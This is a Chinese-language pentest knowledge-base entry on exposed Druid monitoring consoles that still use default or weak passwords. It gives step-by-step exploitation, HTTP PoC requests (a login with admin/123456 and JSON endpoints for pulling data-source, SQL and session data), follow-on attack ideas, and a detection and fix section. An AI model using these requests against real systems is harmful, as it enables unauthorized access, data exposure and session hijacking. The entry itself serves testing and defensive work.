---
id: web-java-component-druid-monitor-default-credentials
title: Druid StatViewServlet 监控台默认口令登录：数据源、SQL、Session 与 classpath 信息泄露
type: scenario
domain: web
path: web/java/component
technique: default-credentials-monitoring-console
tags:
- java
- druid
- spring-boot
- default-credentials
- weak-password
- information-disclosure
- recon
- monitoring-console
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:29:37+08:00'
  notes: 已对照原文与图05/06/07核对：SpringBootScan 发现 /druid/login.html，默认口令登录成功（原文未披露口令），Stat Index 泄露 Druid 1.1.10/JVM/classpath；未独立复跑
url: /docs/web/java/component/web-java-component-druid-monitor-default-credentials/
draft: false
kb_aliases:
- Druid 弱口令
- Druid Monitor 默认密码
- /druid/login.html 弱口令
- Druid 监控台未授权
- Druid StatViewServlet 信息泄露
---

## 一句话结论

Spring Boot/Java 项目暴露的 Druid StatViewServlet 监控台（`/druid/login.html`）若沿用部署模板的默认或弱口令，攻击者可直接登录，读取数据源、SQL、URI、Session、JVM/classpath 等运行态信息，为后续横向和会话劫持提供情报。

## 原理

- Alibaba Druid 的 `StatViewServlet` 提供 `/druid/index.html`、`/druid/login.html`、`/druid/submitLogin` 等监控路由；是否要求登录、账号密码由 `loginUsername`/`loginPassword` 初始化参数决定。
- 大量项目直接复制 Druid 监控配置模板，未修改默认账号密码；也有项目为避免前端页面 401，把 `/druid/**` 加入鉴权拦截器的排除列表，导致监控台从“内网运维页”变成外部可达的登录入口。
- 登录成功后的监控页暴露的信息具有直接攻击价值：数据源页显示 JDBC URL、驱动、用户名；SQL 监控显示真实表名与查询语句；URI 监控显示全部业务路由；Session 监控列出活动 session ID；JVM/Stat Index 页显示 Druid 版本、JVM 版本和 classpath 上的 jar 路径。
- 这些信息把黑盒目标转化为半白盒：classpath 泄露服务 jar 名称与部署路径，数据源信息可用于数据库弱口令尝试，Session 信息可用于会话固定/劫持（前提是能找到可用的后台路由）。
- 该漏洞成立的关键不是 Druid 本身有代码缺陷，而是“监控组件默认开启 + 默认口令 + 鉴权排除”的部署组合。

## 触发条件

- 目标为 Spring Boot 或传统 Java Web 项目，且引入了 Druid 并启用 StatViewServlet。
- `/druid/index.html`、`/druid/login.html` 从攻击面可达（未被 nginx/网关拦截）。
- 监控台使用默认口令或可猜弱口令，且未限制来源 IP。
- 监控路径未被业务鉴权覆盖（常见于前后端分离项目）。

## 利用步骤

1. 指纹与目录发现：用 SpringBootScan 一类字典或手工访问 `/druid/index.html`；未登录时通常 302 跳转到 `/druid/login.html`。
2. 确认登录页存在后，尝试部署模板常见默认口令与弱口令组合（如 `admin/123456`、`druid/druid`、`admin/admin`；原文未披露实际成功口令）。
3. 登录成功后访问 `/druid/index.html`，记录 Stat Index 中的 Druid 版本、JVM 版本与 classpath 路径。
4. 依次查看数据源、SQL 监控、URI 监控、Session 监控、spring 监控；也可直接请求对应的 JSON API（如 `/druid/datasource.json`、`/druid/sql.json`、`/druid/websession.json`）便于批量提取。
5. 用泄露的 JDBC URL/用户名做数据库弱口令尝试；用 URI 列表寻找后台入口；若拿到 Session ID 且有后台路由，可尝试会话劫持。

## PoC

```http
GET /druid/index.html HTTP/1.1
Host: target

HTTP/1.1 302 Found
Location: /druid/login.html
```

```http
POST /druid/submitLogin HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

loginUsername=admin&loginPassword=123456
```

登录后读取监控数据：

```http
GET /druid/index.html HTTP/1.1
Host: target
Cookie: <登录后返回的 Cookie>
```

```http
GET /druid/datasource.json HTTP/1.1
GET /druid/sql.json HTTP/1.1
GET /druid/websession.json HTTP/1.1
GET /druid/uri.json HTTP/1.1
Host: target
Cookie: <登录后返回的 Cookie>
```

## 变体与关联

- 变体：口令并非出厂默认而是“厂商部署模板默认”（如系统集成商统一设置的 `admin/123456`），需要用常见弱口令字典而不是单一默认值。
- 变体：仅 `/druid/login.html` 可达但登录接口被网关拦截时，可尝试直接访问 `/druid/*.json` 看是否漏配鉴权。
- 关联：[[pentest-recon-spring-swagger2-unauth-api-doc-exposure]]（同一次 Spring Boot 信息收集中，Swagger 文档与 Druid 监控台常同时暴露）、[[pentest-recon-spring-actuator-backend-port-nginx-bypass]]（前端静态壳后寻找真实后端入口）。
- 边界：若监控台已改强口令、绑定内网 IP、或 StatViewServlet 被关闭，则本场景不成立；Druid 监控页本身不直接提供命令执行，危害以信息泄露和后续横向为主。

## 检测与防御

- 检测：外网访问 `/druid/login.html`、`/druid/submitLogin`、`/druid/*.json` 的日志；登录成功后短时间内遍历多个监控页/JSON API 的行为；监控路径未被统一鉴权覆盖的配置漂移。
- 修复：修改 `loginUsername`/`loginPassword` 为强随机口令；不需要监控时关闭 StatViewServlet；必须保留时限制来源 IP、加独立鉴权，并在 nginx/网关层禁止外网访问 `/druid/**`。
- 加固：不要把 `/druid/**` 放入鉴权白名单；对监控台的登录做失败次数限制与告警；定期扫描暴露的 Druid 页面。
